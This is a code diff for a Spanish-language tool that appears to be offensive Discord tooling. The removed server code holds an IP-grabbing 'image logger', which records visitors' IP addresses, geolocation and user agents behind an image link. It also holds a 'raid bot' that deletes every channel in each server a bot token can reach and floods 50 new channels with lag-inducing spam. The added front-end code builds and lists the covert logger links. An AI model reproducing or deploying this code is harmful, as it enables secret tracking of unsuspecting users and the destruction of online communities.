@@ -1,135 +1,133 @@
-const express = require('express');
-const { Client, IntentsBitField, ChannelType, ActivityType } = require('discord.js');
-const axios = require('axios');
-const app = express();
+// Variables para image logger
+let imagenActual = null;
 
-app.use(express.json());
-app.use(express.static('public'));
+// Configurar drag & drop
+const dropArea = document.getElementById('dropArea');
+const imageInput = document.getElementById('imageInput');
 
-let ipLogs = []; 
-const MY_WEB = "https://railway.app";
-
-// --- LOGGER CON GEOLOCALIZACIÓN (CORREGIDO) ---
-app.get('/image/:id.png', async (req, res) => {
-    const targetImage = req.query.url || 'https://imgur.com';
-    const ip = req.headers['x-forwarded-for'] || req.socket.remoteAddress || "0.0.0.0";
+if (dropArea) {
+    dropArea.addEventListener('click', () => imageInput.click());
     
-    let geo = "Desconocido";
-    try {
-        // CORREGIDO: Faltaba la barra diagonal en la URL de ip-api.com
-        const response = await axios.get(`http://ip-api.com/json/${ip.split(',')[0]}`);
-        if(response.data.status === 'success') {
-            geo = `${response.data.city}, ${response.data.country} 🚩`;
-        }
-    } catch(e) {
-        console.error("Error obteniendo geolocalización:", e.message);
-    }
-
-    ipLogs.unshift({
-        ip: ip.split(',')[0],
-        geo: geo,
-        date: new Date().toLocaleTimeString(),
-        ua: req.headers['user-agent'] || 'Desconocido'
+    dropArea.addEventListener('dragover', (e) => {
+        e.preventDefault();
+        dropArea.classList.add('border-red-600');
     });
-
-    if (ipLogs.length > 50) ipLogs.pop();
-    res.redirect(targetImage);
-});
-
-app.get('/api/ip-logs', (req, res) => res.json(ipLogs));
-
-// --- RAID BOT GLOBAL (MEJORADO CON MANEJO DE ERRORES) ---
-app.post('/api/run-raid', async (req, res) => {
-    const { token, msg, channelName } = req.body;
     
-    // Validación básica
-    if (!token) {
-        return res.status(400).json({ error: "Token requerido" });
-    }
-    
-    const bot = new Client({ 
-        intents: [IntentsBitField.Flags.Guilds, IntentsBitField.Flags.GuildMessages] 
+    dropArea.addEventListener('dragleave', () => {
+        dropArea.classList.remove('border-red-600');
     });
-
-    try {
-        await bot.login(token);
+    
+    dropArea.addEventListener('drop', (e) => {
+        e.preventDefault();
+        dropArea.classList.remove('border-red-600');
         
-        bot.once('ready', async () => {
-            console.log(`Bot conectado como ${bot.user.tag}`);
-            
-            bot.user.setPresence({ 
-                activities: [{ 
-                    name: `WEB: ${MY_WEB}`, 
-                    type: ActivityType.Streaming, 
-                    url: "https://twitch.tv" 
-                }],
-                status: 'online'
-            });
-
-            // CORREGIDO: Mejor manejo de promesas y evitar operaciones bloqueantes
-            const guilds = bot.guilds.cache;
-            const raidPromises = [];
-            
-            guilds.forEach((guild) => {
-                raidPromises.push(processGuild(guild, msg, channelName));
-            });
-
-            try {
-                await Promise.all(raidPromises);
-                res.json({ success: true, count: guilds.size });
-            } catch (error) {
-                console.error("Error en raid:", error);
-                res.status(500).json({ error: "Error durante el raid" });
-            }
-        });
-    } catch (err) { 
-        console.error("Error de login:", err.message);
-        res.status(401).json({ error: "Token Inválido o error de conexión" }); 
-    }
-});
-
-// Función auxiliar para procesar cada guild
-async function processGuild(guild, msg, channelName) {
-    try {
-        const channels = await guild.channels.fetch();
-        
-        // Eliminar canales existentes con manejo de límites de rate
-        const deletePromises = channels.map(ch => 
-            ch.delete().catch(e => console.log(`No se pudo eliminar ${ch.name}: ${e.message}`))
-        );
-        await Promise.all(deletePromises);
-        
-        const lagMsg = (msg || "@everyone RAIDED") + "\n" + "█".repeat(850);
-        
-        // Crear nuevos canales de forma secuencial para evitar rate limiting
-        for (let i = 0; i < 50; i++) {
-            try {
-                const ch = await guild.channels.create({ 
-                    name: channelName || "raid-global", 
-                    type: ChannelType.GuildText 
-                });
-                
-                // Enviar mensajes iniciales
-                for (let j = 0; j < 15; j++) {
-                    await ch.send(lagMsg).catch(() => {});
-                }
-                
-                // Configurar intervalo para mensajes continuos
-                setInterval(() => ch.send(lagMsg).catch(() => {}), 250);
-                
-                // Pequeña pausa para evitar rate limiting
-                await new Promise(resolve => setTimeout(resolve, 100));
-            } catch (e) {
-                console.log(`Error creando canal ${i}: ${e.message}`);
-            }
+        const files = e.dataTransfer.files;
+        if (files.length > 0) {
+            imageInput.files = files;
+            previsualizarImagen(files[0]);
         }
-    } catch (e) {
-        console.log(`Error procesando guild ${guild.name}: ${e.message}`);
+    });
+    
+    imageInput.addEventListener('change', (e) => {
+        if (e.target.files.length > 0) {
+            previsualizarImagen(e.target.files[0]);
+        }
+    });
+}
+
+// Previsualizar imagen seleccionada
+function previsualizarImagen(file) {
+    if (file && file.type.startsWith('image/')) {
+        const reader = new FileReader();
+        reader.onload = (e) => {
+            document.getElementById('imagePreview').src = e.target.result;
+            document.getElementById('previewArea').classList.remove('hidden');
+            document.getElementById('dropArea').classList.add('hidden');
+            imagenActual = file;
+        };
+        reader.readAsDataURL(file);
     }
 }
 
-// PUERTO FORZADO A 8080
-const PORT = 8080;
-app.listen(PORT, '0.0.0.0', () => {
-    console.log(`Elite Engine operativo en http://0.0.0.0:${PORT}`);
-});
+// Subir imagen al servidor
+async function subirImagen() {
+    if (!imagenActual) {
+        alert('❌ Selecciona una imagen primero');
+        return;
+    }
+
+    const btn = document.getElementById('uploadBtn');
+    btn.innerText = '📤 SUBIENDO...';
+    
+    const formData = new FormData();
+    formData.append('image', imagenActual);
+
+    try {
+        const res = await fetch('/api/upload-image', {
+            method: 'POST',
+            body: formData
+        });
+        
+        const data = await res.json();
+        
+        if (data.success) {
+            // Mostrar links generados
+            document.getElementById('loggerUrl').innerText = data.loggerUrl;
+            document.getElementById('discordUrl').innerText = data.discordPreview;
+            document.getElementById('previewDiscord').src = data.previewUrl;
+            document.getElementById('generatedLinks').classList.remove('hidden');
+            
+            // Resetear UI
+            document.getElementById('previewArea').classList.add('hidden');
+            document.getElementById('dropArea').classList.remove('hidden');
+            imagenActual = null;
+            imageInput.value = '';
+            
+            // Cargar lista actualizada
+            cargarImagenes();
+            
+            notificar('✅ IMAGEN SUBIDA', 'Link generado correctamente');
+        }
+    } catch (e) {
+        alert('Error: ' + e.message);
+    }
+    
+    btn.innerText = '📤 SUBIR IMAGEN';
+}
+
+// Cargar lista de imágenes subidas
+async function cargarImagenes() {
+    try {
+        const res = await fetch('/api/images');
+        const images = await res.json();
+        
+        const list = document.getElementById('imagesList');
+        list.innerHTML = images.map(img => `
+            <div class="bg-black/50 p-2 rounded border border-red-900/30">
+                <img src="${img.url}" class="w-full h-16 object-cover rounded mb-2">
+                <div class="text-[8px] font-mono text-gray-500 truncate">${img.originalName}</div>
+                <div class="text-[8px] text-red-600">${img.views} vistas</div>
+                <button onclick="copiarTextoDirecto('${img.loggerUrl}')" 
+                    class="text-[8px] text-red-400 hover:text-red-600 mt-1">
+                    📋 COPIA
+                </button>
+            </div>
+        `).join('');
+    } catch (e) {}
+}
+
+// Funciones para copiar texto
+function copiarTexto(elementId) {
+    const text = document.getElementById(elementId).innerText;
+    navigator.clipboard.writeText(text);
+    notificar('📋 COPIADO', 'URL en el portapapeles');
+}
+
+function copiarTextoDirecto(text) {
+    navigator.clipboard.writeText(text);
+    notificar('📋 COPIADO', 'URL en el portapapeles');
+}
+
+// Cargar imágenes al iniciar
+setInterval(cargarImagenes, 10000);
+cargarImagenes();
